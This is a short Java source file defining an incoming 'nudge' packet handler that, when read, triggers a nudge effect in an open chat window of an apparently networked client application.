package com.redpois0n.packets.in;

import com.redpois0n.Connection;

public class PacketNUDGE extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		if (Connection.frameChat != null) {
			Connection.frameChat.nudge();
		}
	}

}
